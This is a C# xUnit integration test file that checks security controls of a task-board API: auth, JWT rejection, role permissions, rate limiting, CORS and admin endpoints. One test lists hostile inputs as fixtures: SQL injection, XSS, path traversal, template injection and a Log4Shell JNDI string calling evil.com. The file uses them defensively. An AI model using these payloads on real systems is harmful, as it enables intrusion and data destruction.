using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Http;
using System.Net.Http.Json;
using System.Threading.Tasks;
using Microsoft.Extensions.DependencyInjection;
using TaskHub.Api.Infrastructure.Data;
using TaskHub.Api.Models.Dtos.Auth;
using TaskHub.Api.Models.Dtos.Boards;
using TaskHub.Api.Models.Entities.Boards;
using TaskHub.Api.Models.Entities.Enums;
using Xunit;

namespace TaskHub.Api.IntegrationTests
{
    [Collection("TestCollection")]
    public class SecurityTests : IClassFixture<CustomWebApplicationFactory>
    {
        private readonly CustomWebApplicationFactory _factory;

        public SecurityTests(CustomWebApplicationFactory factory)
        {
            _factory = factory;
        }

        [Fact]
        public async Task API_RequiresAuthentication_ForProtectedEndpoints()
        {
            // Arrange
            var client = _factory.CreateClient();

            // Act & Assert - Test various protected endpoints without authentication
            var protectedEndpoints = new[]
            {
                "/api/boards",
                "/api/boards/123",
                "/api/lists",
                "/api/cards"
            };

            foreach (var endpoint in protectedEndpoints)
            {
                var response = await client.GetAsync(endpoint);
                Assert.Equal(HttpStatusCode.Unauthorized, response.StatusCode);
            }
        }

        [Fact]
        public async Task JWT_TokenValidation_RejectsInvalidTokens()
        {
            // Arrange
            var client = _factory.CreateClient();
            var invalidTokens = new[]
            {
                "Bearer invalid-token",
                "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.invalid.signature",
                "Bearer ",
                "invalid-format-token"
            };

            // Act & Assert
            foreach (var token in invalidTokens)
            {
                client.DefaultRequestHeaders.Clear();
                client.DefaultRequestHeaders.Add("Authorization", token);
                
                var response = await client.GetAsync("/api/boards");
                Assert.Equal(HttpStatusCode.Unauthorized, response.StatusCode);
            }
        }

        [Fact]
        public async Task BoardAccess_RespectsBoardMembership()
        {
            // Arrange
            using var scope = _factory.Services.CreateScope();
            var dbContext = scope.ServiceProvider.GetRequiredService<ApplicationDbContext>();
            await dbContext.Database.EnsureCreatedAsync();

            // Create two users
            var user1 = TestDataGenerator.GenerateTestUser("user1@test.com");
            var user2 = TestDataGenerator.GenerateTestUser("user2@test.com");
            
            dbContext.Users.AddRange(user1, user2);
            await dbContext.SaveChangesAsync();

            // Create board owned by user1
            var board = new Board
            {
                Id = Guid.NewGuid(),
                Title = "Private Board",
                Description = "User1's private board",
                OwnerId = user1.Id,
                CreatedAt = DateTime.UtcNow,
                UpdatedAt = DateTime.UtcNow
            };
            
            dbContext.Boards.Add(board);
            await dbContext.SaveChangesAsync();

            // Get tokens for both users
            var user1Client = await GetAuthenticatedClient(user1.Email, "TestPassword123!");
            var user2Client = await GetAuthenticatedClient(user2.Email, "TestPassword123!");

            // Act & Assert
            // User1 (owner) should have access
            var user1Response = await user1Client.GetAsync($"/api/boards/{board.Id}");
            Assert.Equal(HttpStatusCode.OK, user1Response.StatusCode);

            // User2 (non-member) should be forbidden
            var user2Response = await user2Client.GetAsync($"/api/boards/{board.Id}");
            Assert.Equal(HttpStatusCode.Forbidden, user2Response.StatusCode);
        }

        [Fact]
        public async Task BoardRoles_EnforceProperPermissions()
        {
            // Arrange
            using var scope = _factory.Services.CreateScope();
            var dbContext = scope.ServiceProvider.GetRequiredService<ApplicationDbContext>();
            await dbContext.Database.EnsureCreatedAsync();

            var owner = TestDataGenerator.GenerateTestUser("owner@test.com");
            var member = TestDataGenerator.GenerateTestUser("member@test.com");
            var viewer = TestDataGenerator.GenerateTestUser("viewer@test.com");
            
            dbContext.Users.AddRange(owner, member, viewer);
            await dbContext.SaveChangesAsync();

            var board = new Board
            {
                Id = Guid.NewGuid(),
                Title = "Test Board",
                OwnerId = owner.Id,
                CreatedAt = DateTime.UtcNow,
                UpdatedAt = DateTime.UtcNow
            };

            var memberRole = new BoardMember
            {
                BoardId = board.Id,
                UserId = member.Id,
                Role = BoardRole.Member,
                JoinedAt = DateTime.UtcNow
            };

            var viewerRole = new BoardMember
            {
                BoardId = board.Id,
                UserId = viewer.Id,
                Role = BoardRole.Viewer,
                JoinedAt = DateTime.UtcNow
            };

            dbContext.Boards.Add(board);
            dbContext.BoardMembers.AddRange(memberRole, viewerRole);
            await dbContext.SaveChangesAsync();

            // Get authenticated clients
            var ownerClient = await GetAuthenticatedClient(owner.Email, "TestPassword123!");
            var memberClient = await GetAuthenticatedClient(member.Email, "TestPassword123!");
            var viewerClient = await GetAuthenticatedClient(viewer.Email, "TestPassword123!");

            // Act & Assert
            // Test board update permissions
            var updateDto = new UpdateBoardDto { Title = "Updated Title", Description = "Updated description" };

            // Owner should be able to update
            var ownerUpdateResponse = await ownerClient.PutAsJsonAsync($"/api/boards/{board.Id}", updateDto);
            Assert.Equal(HttpStatusCode.OK, ownerUpdateResponse.StatusCode);

            // Member should be able to update
            var memberUpdateResponse = await memberClient.PutAsJsonAsync($"/api/boards/{board.Id}", updateDto);
            Assert.Equal(HttpStatusCode.OK, memberUpdateResponse.StatusCode);

            // Viewer should NOT be able to update
            var viewerUpdateResponse = await viewerClient.PutAsJsonAsync($"/api/boards/{board.Id}", updateDto);
            Assert.Equal(HttpStatusCode.Forbidden, viewerUpdateResponse.StatusCode);

            // Test board deletion permissions (owner only)
            // Member should NOT be able to delete
            var memberDeleteResponse = await memberClient.DeleteAsync($"/api/boards/{board.Id}");
            Assert.Equal(HttpStatusCode.Forbidden, memberDeleteResponse.StatusCode);

            // Viewer should NOT be able to delete
            var viewerDeleteResponse = await viewerClient.DeleteAsync($"/api/boards/{board.Id}");
            Assert.Equal(HttpStatusCode.Forbidden, viewerDeleteResponse.StatusCode);

            // Owner should be able to delete
            var ownerDeleteResponse = await ownerClient.DeleteAsync($"/api/boards/{board.Id}");
            Assert.Equal(HttpStatusCode.NoContent, ownerDeleteResponse.StatusCode);
        }

        [Fact]
        public async Task RateLimit_PreventsBruteForceAttacks()
        {
            // Arrange
            var client = _factory.CreateClient();
            var loginDto = new LoginDto
            {
                EmailOrUsername = "admin",
                Password = "wrong-password"
            };

            var successCount = 0;
            var tooManyRequestsCount = 0;

            // Act - Attempt multiple rapid login requests
            var tasks = new List<Task<HttpResponseMessage>>();
            for (int i = 0; i < 20; i++)
            {
                tasks.Add(client.PostAsJsonAsync("/api/auth/login", loginDto));
            }

            var responses = await Task.WhenAll(tasks);

            // Assert
            foreach (var response in responses)
            {
                if (response.StatusCode == HttpStatusCode.Unauthorized)
                {
                    successCount++; // Expected for wrong password
                }
                else if (response.StatusCode == HttpStatusCode.TooManyRequests)
                {
                    tooManyRequestsCount++;
                }
            }

            // Should see rate limiting after several attempts
            Assert.True(tooManyRequestsCount > 0, "Rate limiting should kick in after multiple failed attempts");
            Assert.True(successCount > 0, "Some requests should process normally before rate limiting");
        }

        [Fact]
        public async Task CORS_ConfiguredCorrectly()
        {
            // Arrange
            var client = _factory.CreateClient();

            // Act - Send OPTIONS request (preflight)
            var request = new HttpRequestMessage(HttpMethod.Options, "/api/boards");
            request.Headers.Add("Origin", "http://localhost:3000");
            request.Headers.Add("Access-Control-Request-Method", "GET");
            
            var response = await client.SendAsync(request);

            // Assert
            Assert.Equal(HttpStatusCode.NoContent, response.StatusCode);
            
            // Check CORS headers
            Assert.True(response.Headers.Contains("Access-Control-Allow-Origin"));
            Assert.True(response.Headers.Contains("Access-Control-Allow-Methods"));
            Assert.True(response.Headers.Contains("Access-Control-Allow-Headers"));
        }

        [Fact]
        public async Task API_ReturnsSecurityHeaders()
        {
            // Arrange
            var client = _factory.CreateClient();

            // Act
            var response = await client.GetAsync("/api/auth/login");

            // Assert - Check for important security headers
            var headers = response.Headers;
            
            // Content-Type should be set correctly
            Assert.NotNull(response.Content.Headers.ContentType);
            
            // Check for absence of sensitive information in error responses
            var content = await response.Content.ReadAsStringAsync();
            Assert.DoesNotContain("Connection string", content, StringComparison.OrdinalIgnoreCase);
            Assert.DoesNotContain("Database", content, StringComparison.OrdinalIgnoreCase);
            Assert.DoesNotContain("Exception", content, StringComparison.OrdinalIgnoreCase);
        }

        [Fact]
        public async Task InputValidation_PreventsInjectionAttacks()
        {
            // Arrange
            var client = await GetAuthenticatedClient("admin", "admin");

            // Test SQL injection attempts
            var maliciousInputs = new[]
            {
                "'; DROP TABLE users; --",
                "<script>alert('xss')</script>",
                "../../etc/passwd",
                "{{7*7}}",
                "${jndi:ldap://evil.com/a}"
            };

            // Act & Assert
            foreach (var maliciousInput in maliciousInputs)
            {
                var createBoardDto = new CreateBoardDto
                {
                    Title = maliciousInput,
                    Description = "Test board"
                };

                var response = await client.PostAsJsonAsync("/api/boards", createBoardDto);
                
                // Should either be rejected with bad request or properly sanitized
                if (response.IsSuccessStatusCode)
                {
                    var content = await response.Content.ReadAsStringAsync();
                    // If accepted, ensure malicious content is not returned as-is
                    Assert.DoesNotContain("<script>", content);
                    Assert.DoesNotContain("DROP TABLE", content);
                }
                else
                {
                    // Should be rejected with appropriate error code
                    Assert.True(
                        response.StatusCode == HttpStatusCode.BadRequest ||
                        response.StatusCode == HttpStatusCode.UnprocessableEntity
                    );
                }
            }
        }

        [Fact]
        public async Task AdminEndpoints_RequireAdminRole()
        {
            // Arrange
            var regularUserClient = await GetAuthenticatedClient("demo", "Demo123!");
            var adminClient = await GetAuthenticatedClient("admin", "admin");

            // Act & Assert - Test development endpoints (admin only)
            var adminOnlyEndpoints = new[]
            {
                "/api/development/reset-users",
                "/api/development/health"
            };

            foreach (var endpoint in adminOnlyEndpoints)
            {
                // Regular user should be forbidden
                var userResponse = await regularUserClient.PostAsync(endpoint, null);
                Assert.Equal(HttpStatusCode.Forbidden, userResponse.StatusCode);

                // Admin should have access
                var adminResponse = await adminClient.PostAsync(endpoint, null);
                Assert.True(
                    adminResponse.StatusCode == HttpStatusCode.OK ||
                    adminResponse.StatusCode == HttpStatusCode.NoContent
                );
            }
        }

        private async Task<HttpClient> GetAuthenticatedClient(string usernameOrEmail, string password)
        {
            var client = _factory.CreateClient();
            
            var loginDto = new LoginDto
            {
                EmailOrUsername = usernameOrEmail,
                Password = password
            };

            var loginResponse = await client.PostAsJsonAsync("/api/auth/login", loginDto);
            
            if (loginResponse.IsSuccessStatusCode)
            {
                var authResponse = await loginResponse.Content.ReadFromJsonAsync<AuthResponseDto>();
                client.DefaultRequestHeaders.Authorization = 
                    new System.Net.Http.Headers.AuthenticationHeaderValue("Bearer", authResponse?.Token);
            }

            return client;
        }
    }
}

